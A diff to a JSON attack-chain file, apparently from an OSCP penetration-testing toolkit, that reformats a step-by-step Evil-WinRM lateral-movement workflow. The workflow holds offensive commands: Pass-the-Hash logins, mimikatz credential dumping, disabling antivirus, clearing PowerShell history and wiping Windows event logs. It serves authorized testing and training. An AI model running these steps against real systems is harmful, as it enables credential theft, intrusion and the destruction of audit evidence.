@@ -1,5 +1,5 @@
 {
-  "id": "windows-evil-winrm-operational",
+  "id": "evil-winrm-operational-workflow",
   "name": "Evil-WinRM Complete Operational Workflow",
   "description": "Complete operational guide for Evil-WinRM lateral movement including connection, file transfers, tool deployment, and credential exfiltration.\n\nThis chain covers the ENTIRE Evil-WinRM workflow for OSCP lateral movement: connection establishment (password and Pass-the-Hash), environment verification, file upload/download, tool execution, credential exfiltration, and session management. Focus on OPERATIONAL usage in real engagements.\n\nWHY EVIL-WINRM IS PREFERRED FOR OSCP:\n1. Interactive PowerShell shell (not cmd.exe like PSExec)\n2. Built-in file upload/download (no SMB server needed)\n3. No service creation (stealthier than PSExec)\n4. Supports Pass-the-Hash natively (-H flag)\n5. Works over WinRM (port 5985/5986) when SMB blocked\n6. Automatic handling of PS remoting restrictions\n\nCRITICAL SYNTAX: Evil-WinRM requires 'DOMAIN\\user' format for domain accounts. There is NO -d flag for domain (common mistake). Use single quotes to escape backslash in bash.\n\nSUCCESS RATE: Very high (85-90%) IF WinRM is enabled. Most OSCP lab systems have WinRM enabled by default. Failures usually due to:\n1. WinRM not enabled (15% of systems) - fallback to PSExec/WMI\n2. Wrong credential syntax (domain\\user vs user@domain)\n3. Firewall blocking ports 5985/5986\n4. Certificate validation issues (HTTPS WinRM)\n\nLESSON FROM CORP-DCSYNC WRITEUP: 'Evil-WinRM superior to PSExec for lateral movement (no service creation, file transfer built-in). Critical syntax: domain\\user format (NOT -d flag - doesn't exist).'",
   "version": "1.0.0",
@@ -40,7 +40,7 @@
       "id": "verify-winrm-accessible",
       "name": "Verify WinRM Service Accessible",
       "objective": "Confirm target system has WinRM enabled and accessible before attempting connection",
-      "description": "Check if target system has WinRM service enabled and ports accessible. This prevents wasted time attempting connections to systems without WinRM.\n\nPort Scan (Quick Check):\n```bash\nnmap -p 5985,5986 <TARGET_IP>\n```\n\nPorts:\n- 5985: HTTP WinRM (default, unencrypted)\n- 5986: HTTPS WinRM (encrypted, requires SSL)\n\nExpected Output (WinRM Enabled):\n```\nPORT     STATE SERVICE\n5985/tcp open  wsman\n5986/tcp open  wsmans\n```\n\nExpected Output (WinRM Disabled):\n```\nPORT     STATE  SERVICE\n5985/tcp closed wsman\n5986/tcp closed wsmans\n```\n\nDetailed Service Detection:\n```bash\nnmap -p 5985,5986 -sV <TARGET_IP>\n```\n\nExpected:\n```\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n```\n\nAlternative: Test with crackmapexec:\n```bash\ncrackmapexec winrm <TARGET_IP> -u <user> -p <password>\n```\n\nExpected (WinRM Enabled):\n```\nWINRM  <TARGET_IP>  5985  <HOSTNAME>  [+] DOMAIN\\user:password (Pwn3d!)\n```\n\nWinRM Status Interpretation:\n- Port 5985 open: WinRM enabled, use evil-winrm normally\n- Port 5986 open: HTTPS WinRM, use evil-winrm with -S flag\n- Both closed: WinRM disabled, use alternative (PSExec, WMI, RDP)\n- Filtered: Firewall blocking, may still work from internal network\n\nChecking from Windows (if you have access to another domain system):\n```powershell\nTest-NetConnection -ComputerName <TARGET> -Port 5985\n```\n\nOR\n```powershell\nTest-WSMan -ComputerName <TARGET>\n```\n\nExpected (WinRM Enabled):\n```\nwsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd\nProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\nProductVendor   : Microsoft Corporation\nProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0\n```\n\nTroubleshooting:\n\n1. Ports Closed:\n   - WinRM may not be enabled on target\n   - Check if target is Windows Server (more likely to have WinRM)\n   - Try alternative lateral movement (PSExec, WMI)\n\n2. Ports Filtered:\n   - Firewall blocking external access\n   - Try from pivot point inside network\n   - Check if you're on correct network segment\n\n3. Connection Timeout:\n   - Target may be offline (ping first)\n   - Network routing issues\n   - Check VPN/tunnel status\n\nWinRM Enabling (if you have admin access via another method):\n```powershell\n# From target system (via PSExec or RDP):\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '*' -Force\nRestart-Service WinRM\n```\n\nFirewall Rule (if needed):\n```powershell\nNew-NetFirewallRule -Name \"WinRM-HTTP\" -DisplayName \"WinRM HTTP\" -Enabled True -Direction Inbound -Protocol TCP -LocalPort 5985\n```\n\nVerification Summary:\n- ✓ Port 5985 or 5986 open\n- ✓ Service responds to nmap scan\n- ✓ crackmapexec confirms WinRM accessibility\n- ✓ Target system online and accessible\n\nIf WinRM NOT available:\n- Use PSExec: impacket-psexec <domain>/<user>:<password>@<target>\n- Use WMI: impacket-wmiexec <domain>/<user>:<password>@<target>\n- Use RDP: xfreerdp /u:<user> /p:<password> /v:<target>\n- Use SMB exec: impacket-smbexec <domain>/<user>:<password>@<target>",
+      "description": "Check if target system has WinRM service enabled and ports accessible. This prevents wasted time attempting connections to systems without WinRM.\n\nPort Scan (Quick Check):\n```bash\nnmap -p 5985,5986 <TARGET_IP>\n```\n\nPorts:\n- 5985: HTTP WinRM (default, unencrypted)\n- 5986: HTTPS WinRM (encrypted, requires SSL)\n\nExpected Output (WinRM Enabled):\n```\nPORT     STATE SERVICE\n5985/tcp open  wsman\n5986/tcp open  wsmans\n```\n\nExpected Output (WinRM Disabled):\n```\nPORT     STATE  SERVICE\n5985/tcp closed wsman\n5986/tcp closed wsmans\n```\n\nDetailed Service Detection:\n```bash\nnmap -p 5985,5986 -sV <TARGET_IP>\n```\n\nExpected:\n```\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n```\n\nAlternative: Test with crackmapexec:\n```bash\ncrackmapexec winrm <TARGET_IP> -u <user> -p <password>\n```\n\nExpected (WinRM Enabled):\n```\nWINRM  <TARGET_IP>  5985  <HOSTNAME>  [+] DOMAIN\\user:password (Pwn3d!)\n```\n\nWinRM Status Interpretation:\n- Port 5985 open: WinRM enabled, use evil-winrm normally\n- Port 5986 open: HTTPS WinRM, use evil-winrm with -S flag\n- Both closed: WinRM disabled, use alternative (PSExec, WMI, RDP)\n- Filtered: Firewall blocking, may still work from internal network\n\nChecking from Windows (if you have access to another domain system):\n```powershell\nTest-NetConnection -ComputerName <TARGET> -Port 5985\n```\n\nOR\n```powershell\nTest-WSMan -ComputerName <TARGET>\n```\n\nExpected (WinRM Enabled):\n```\nwsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd\nProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\nProductVendor   : Microsoft Corporation\nProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0\n```\n\nTroubleshooting:\n\n1. Ports Closed:\n   - WinRM may not be enabled on target\n   - Check if target is Windows Server (more likely to have WinRM)\n   - Try alternative lateral movement (PSExec, WMI)\n\n2. Ports Filtered:\n   - Firewall blocking external access\n   - Try from pivot point inside network\n   - Check if you're on correct network segment\n\n3. Connection Timeout:\n   - Target may be offline (ping first)\n   - Network routing issues\n   - Check VPN/tunnel status\n\nWinRM Enabling (if you have admin access via another method):\n```powershell\n# From target system (via PSExec or RDP):\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '*' -Force\nRestart-Service WinRM\n```\n\nFirewall Rule (if needed):\n```powershell\nNew-NetFirewallRule -Name \"WinRM-HTTP\" -DisplayName \"WinRM HTTP\" -Enabled True -Direction Inbound -Protocol TCP -LocalPort 5985\n```\n\nVerification Summary:\n- \u2713 Port 5985 or 5986 open\n- \u2713 Service responds to nmap scan\n- \u2713 crackmapexec confirms WinRM accessibility\n- \u2713 Target system online and accessible\n\nIf WinRM NOT available:\n- Use PSExec: impacket-psexec <domain>/<user>:<password>@<target>\n- Use WMI: impacket-wmiexec <domain>/<user>:<password>@<target>\n- Use RDP: xfreerdp /u:<user> /p:<password> /v:<target>\n- Use SMB exec: impacket-smbexec <domain>/<user>:<password>@<target>",
       "command_ref": null,
       "evidence": [
         "Nmap output showing ports 5985/5986 open",
@@ -61,7 +61,9 @@
         "Ports filtered: Firewall blocking, try from internal pivot",
         "Target offline: Verify system is online (ping, check IP)"
       ],
-      "next_steps": ["establish-connection"]
+      "next_steps": [
+        "establish-connection"
+      ]
     },
     {
       "id": "establish-connection",
@@ -75,7 +77,9 @@
         "hostname confirms target system",
         "Interactive PowerShell session established"
       ],
-      "dependencies": ["verify-winrm-accessible"],
+      "dependencies": [
+        "verify-winrm-accessible"
+      ],
       "repeatable": true,
       "success_criteria": [
         "Evil-WinRM prompt displayed",
@@ -89,7 +93,9 @@
         "Timeout: Check network routing and firewall",
         "Syntax error: Verify 'DOMAIN\\user' format with single quotes"
       ],
-      "next_steps": ["verify-environment"]
+      "next_steps": [
+        "verify-environment"
+      ]
     },
     {
       "id": "verify-environment",
@@ -103,7 +109,9 @@
         "whoami /groups showing local admin membership",
         "systeminfo output with OS version and domain"
       ],
-      "dependencies": ["establish-connection"],
+      "dependencies": [
+        "establish-connection"
+      ],
       "repeatable": true,
       "success_criteria": [
         "Confirmed correct user logged in",
@@ -117,7 +125,9 @@
         "Not local admin: Credentials may be incorrect or user lacks privileges",
         "No writable directories: Create C:\\temp or use %TEMP%"
       ],
-      "next_steps": ["upload-tools"]
+      "next_steps": [
+        "upload-tools"
+      ]
     },
     {
       "id": "upload-tools",
@@ -131,7 +141,9 @@
         "Correct file size",
         "File hash matches original (optional)"
       ],
-      "dependencies": ["verify-environment"],
+      "dependencies": [
+        "verify-environment"
+      ],
       "repeatable": true,
       "success_criteria": [
         "Tools uploaded successfully",
@@ -145,7 +157,9 @@
         "AV deletes files: Add exclusions or use obfuscated versions",
         "File corrupted: Re-upload and verify hash"
       ],
-      "next_steps": ["execute-operations"]
+      "next_steps": [
+        "execute-operations"
+      ]
     },
     {
       "id": "execute-operations",
@@ -159,7 +173,9 @@
         "Enumeration results captured",
         "Flags retrieved (if applicable)"
       ],
-      "dependencies": ["upload-tools"],
+      "dependencies": [
+        "upload-tools"
+      ],
       "repeatable": true,
       "success_criteria": [
         "Tools execute without errors",
@@ -174,7 +190,9 @@
         "AV blocks execution: Use obfuscated tools or disable AV",
         "Command hangs: Timeout or run in background"
       ],
-      "next_steps": ["download-results"]
+      "next_steps": [
+        "download-results"
+      ]
     },
     {
       "id": "download-results",
@@ -189,7 +207,9 @@
         "Flags downloaded (if applicable)",
         "Evidence organized in directory structure"
       ],
-      "dependencies": ["execute-operations"],
+      "dependencies": [
+        "execute-operations"
+      ],
       "repeatable": true,
       "success_criteria": [
         "All result files downloaded",
@@ -203,13 +223,15 @@
         "File corrupted: Re-download and verify size",
         "Files too large: Compress before download"
       ],
-      "next_steps": ["session-cleanup"]
+      "next_steps": [
+        "session-cleanup"
+      ]
     },
     {
       "id": "session-cleanup",
       "name": "Session Cleanup and Exit",
       "objective": "Optionally clean up artifacts and properly close Evil-WinRM session",
-      "description": "Clean up uploaded tools and output files (optional for stealth), then properly exit Evil-WinRM session.\n\nCleanup Options:\n\nOption 1: Full Cleanup (Stealth)\n```powershell\n# Remove uploaded tools:\nRemove-Item C:\\temp\\mimikatz.exe\nRemove-Item C:\\temp\\*.ps1\n\n# Remove output files:\nRemove-Item C:\\temp\\credentials.txt\nRemove-Item C:\\temp\\*.txt\nRemove-Item C:\\temp\\*.kirbi\n\n# Remove directory (if created):\nRemove-Item C:\\temp -Recurse -Force\n```\n\nOption 2: Partial Cleanup (Keep evidence):\n```powershell\n# Remove only tools:\nRemove-Item C:\\temp\\mimikatz.exe\nRemove-Item C:\\temp\\*.ps1\n\n# Keep output files for further analysis\n```\n\nOption 3: No Cleanup (Labs/CTF):\n```\n# Leave everything for writeup documentation\n# Common in OSCP labs where stealth not required\n```\n\nVerify Cleanup:\n```powershell\n# Check directory empty:\ndir C:\\temp\n\n# Check no artifacts in common locations:\ndir C:\\Users\\Public\ndir $env:TEMP\n```\n\nExpected (Full Cleanup):\n```\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n\n(empty)\n```\n\nClear PowerShell History:\n```powershell\nClear-History\nRemove-Item (Get-PSReadlineOption).HistorySavePath\n```\n\nClear Windows Event Logs (Optional, noisy):\n```powershell\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n```\n\nNote: This is VERY noisy and will trigger alerts. Only do if explicitly required.\n\nProper Session Exit:\n\n1. Exit Evil-WinRM:\n```\nexit\n```\n\nExpected:\n```\nInfo: Exiting with code 0\n```\n\n2. Verify Disconnected:\n   - Evil-WinRM prompt disappears\n   - Returns to attacker shell\n   - No error messages\n\nAlternative Exit:\n```\nCtrl+D\n```\n\nOR\n```\nCtrl+C (then confirm)\n```\n\nPost-Session Verification:\n\nOn attacker system:\n```bash\n# Verify all files downloaded:\nls -lh /tmp/CLIENT75_evidence/\n\n# Verify files not empty:\nfind /tmp/CLIENT75_evidence/ -type f -size 0\n\n# Preview key files:\nhead /tmp/CLIENT75_evidence/credentials/credentials.txt\ncat /tmp/CLIENT75_evidence/flags/user.txt\n```\n\nSession Documentation:\n\nCreate session log:\n```bash\ncat > /tmp/CLIENT75_evidence/SESSION_LOG.md << EOF\n# Evil-WinRM Session Log\n\n## Connection Details\n- Target: CLIENT75.CORP.LOCAL (10.10.10.75)\n- User: CORP\\mike\n- Method: Password authentication\n- Start Time: $(date)\n- Duration: 15 minutes\n\n## Actions Performed\n1. Verified environment (whoami, hostname, privileges)\n2. Created C:\\temp directory\n3. Uploaded mimikatz.exe (1.2 MB)\n4. Executed privilege::debug + sekurlsa::logonpasswords\n5. Downloaded credentials.txt (51 KB)\n6. Retrieved user flag\n7. Cleaned up artifacts\n8. Exited session\n\n## Key Findings\n- Local admin confirmed: Yes\n- Credentials extracted: 5 user accounts\n- Domain Admin found: CORP\\administrator\n- User flag: <flag_contents>\n\n## Files Downloaded\n- credentials.txt (mimikatz output)\n- user.txt (flag)\n- domain_admins.txt (DA list)\n- systeminfo.txt (system info)\n\n## Cleanup Status\n- Tools removed: Yes\n- Output files removed: Yes\n- History cleared: Yes\nEOF\n```\n\nCleanup Considerations:\n\nOSCP Labs:\n- Cleanup usually NOT required (lab environment)\n- Focus on documentation and learning\n- Leaving artifacts helps with debugging\n\nReal Engagements:\n- Cleanup depends on scope and requirements\n- Stealth operations: Full cleanup required\n- Red team: May leave for blue team detection training\n- Penetration test: Discuss with client\n\nLegal/Ethical:\n- ONLY perform cleanup if authorized\n- Document all actions (even cleanup)\n- Don't clear logs without explicit permission\n- Maintain chain of custody for evidence\n\nTroubleshooting:\n\n1. Can't Remove Files:\n   - File locked by process: Stop-Process\n   - Permission denied: May need SYSTEM shell\n   - File in use: Close applications first\n\n2. History Not Clearing:\n   - PowerShell history location varies\n   - Check: (Get-PSReadlineOption).HistorySavePath\n   - Manual deletion: Remove-Item <path>\n\n3. Session Won't Exit:\n   - Try Ctrl+C or Ctrl+D\n   - Force close terminal\n   - Verify no background jobs: Get-Job\n\n4. Artifacts Remaining:\n   - Check all upload locations\n   - Check temp directories: $env:TEMP\n   - Search for tools: Get-ChildItem -Recurse -Include mimikatz.exe\n\nFinal Verification:\n\nBefore closing session, verify:\n- ✓ All evidence downloaded\n- ✓ Files verified (not corrupted)\n- ✓ Flags captured (if applicable)\n- ✓ Credentials extracted and tested\n- ✓ Documentation complete\n- ✓ Cleanup performed (if required)\n- ✓ Session properly closed\n\nExit session:\n```\nexit\n```\n\nEnd of Evil-WinRM operational workflow.",
+      "description": "Clean up uploaded tools and output files (optional for stealth), then properly exit Evil-WinRM session.\n\nCleanup Options:\n\nOption 1: Full Cleanup (Stealth)\n```powershell\n# Remove uploaded tools:\nRemove-Item C:\\temp\\mimikatz.exe\nRemove-Item C:\\temp\\*.ps1\n\n# Remove output files:\nRemove-Item C:\\temp\\credentials.txt\nRemove-Item C:\\temp\\*.txt\nRemove-Item C:\\temp\\*.kirbi\n\n# Remove directory (if created):\nRemove-Item C:\\temp -Recurse -Force\n```\n\nOption 2: Partial Cleanup (Keep evidence):\n```powershell\n# Remove only tools:\nRemove-Item C:\\temp\\mimikatz.exe\nRemove-Item C:\\temp\\*.ps1\n\n# Keep output files for further analysis\n```\n\nOption 3: No Cleanup (Labs/CTF):\n```\n# Leave everything for writeup documentation\n# Common in OSCP labs where stealth not required\n```\n\nVerify Cleanup:\n```powershell\n# Check directory empty:\ndir C:\\temp\n\n# Check no artifacts in common locations:\ndir C:\\Users\\Public\ndir $env:TEMP\n```\n\nExpected (Full Cleanup):\n```\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n\n(empty)\n```\n\nClear PowerShell History:\n```powershell\nClear-History\nRemove-Item (Get-PSReadlineOption).HistorySavePath\n```\n\nClear Windows Event Logs (Optional, noisy):\n```powershell\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n```\n\nNote: This is VERY noisy and will trigger alerts. Only do if explicitly required.\n\nProper Session Exit:\n\n1. Exit Evil-WinRM:\n```\nexit\n```\n\nExpected:\n```\nInfo: Exiting with code 0\n```\n\n2. Verify Disconnected:\n   - Evil-WinRM prompt disappears\n   - Returns to attacker shell\n   - No error messages\n\nAlternative Exit:\n```\nCtrl+D\n```\n\nOR\n```\nCtrl+C (then confirm)\n```\n\nPost-Session Verification:\n\nOn attacker system:\n```bash\n# Verify all files downloaded:\nls -lh /tmp/CLIENT75_evidence/\n\n# Verify files not empty:\nfind /tmp/CLIENT75_evidence/ -type f -size 0\n\n# Preview key files:\nhead /tmp/CLIENT75_evidence/credentials/credentials.txt\ncat /tmp/CLIENT75_evidence/flags/user.txt\n```\n\nSession Documentation:\n\nCreate session log:\n```bash\ncat > /tmp/CLIENT75_evidence/SESSION_LOG.md << EOF\n# Evil-WinRM Session Log\n\n## Connection Details\n- Target: CLIENT75.CORP.LOCAL (10.10.10.75)\n- User: CORP\\mike\n- Method: Password authentication\n- Start Time: $(date)\n- Duration: 15 minutes\n\n## Actions Performed\n1. Verified environment (whoami, hostname, privileges)\n2. Created C:\\temp directory\n3. Uploaded mimikatz.exe (1.2 MB)\n4. Executed privilege::debug + sekurlsa::logonpasswords\n5. Downloaded credentials.txt (51 KB)\n6. Retrieved user flag\n7. Cleaned up artifacts\n8. Exited session\n\n## Key Findings\n- Local admin confirmed: Yes\n- Credentials extracted: 5 user accounts\n- Domain Admin found: CORP\\administrator\n- User flag: <flag_contents>\n\n## Files Downloaded\n- credentials.txt (mimikatz output)\n- user.txt (flag)\n- domain_admins.txt (DA list)\n- systeminfo.txt (system info)\n\n## Cleanup Status\n- Tools removed: Yes\n- Output files removed: Yes\n- History cleared: Yes\nEOF\n```\n\nCleanup Considerations:\n\nOSCP Labs:\n- Cleanup usually NOT required (lab environment)\n- Focus on documentation and learning\n- Leaving artifacts helps with debugging\n\nReal Engagements:\n- Cleanup depends on scope and requirements\n- Stealth operations: Full cleanup required\n- Red team: May leave for blue team detection training\n- Penetration test: Discuss with client\n\nLegal/Ethical:\n- ONLY perform cleanup if authorized\n- Document all actions (even cleanup)\n- Don't clear logs without explicit permission\n- Maintain chain of custody for evidence\n\nTroubleshooting:\n\n1. Can't Remove Files:\n   - File locked by process: Stop-Process\n   - Permission denied: May need SYSTEM shell\n   - File in use: Close applications first\n\n2. History Not Clearing:\n   - PowerShell history location varies\n   - Check: (Get-PSReadlineOption).HistorySavePath\n   - Manual deletion: Remove-Item <path>\n\n3. Session Won't Exit:\n   - Try Ctrl+C or Ctrl+D\n   - Force close terminal\n   - Verify no background jobs: Get-Job\n\n4. Artifacts Remaining:\n   - Check all upload locations\n   - Check temp directories: $env:TEMP\n   - Search for tools: Get-ChildItem -Recurse -Include mimikatz.exe\n\nFinal Verification:\n\nBefore closing session, verify:\n- \u2713 All evidence downloaded\n- \u2713 Files verified (not corrupted)\n- \u2713 Flags captured (if applicable)\n- \u2713 Credentials extracted and tested\n- \u2713 Documentation complete\n- \u2713 Cleanup performed (if required)\n- \u2713 Session properly closed\n\nExit session:\n```\nexit\n```\n\nEnd of Evil-WinRM operational workflow.",
       "command_ref": null,
       "evidence": [
         "Cleanup completed (if performed)",
@@ -218,7 +240,9 @@
         "Session log created",
         "Documentation complete"
       ],
-      "dependencies": ["download-results"],
+      "dependencies": [
+        "download-results"
+      ],
       "repeatable": true,
       "success_criteria": [
         "All evidence downloaded before cleanup",
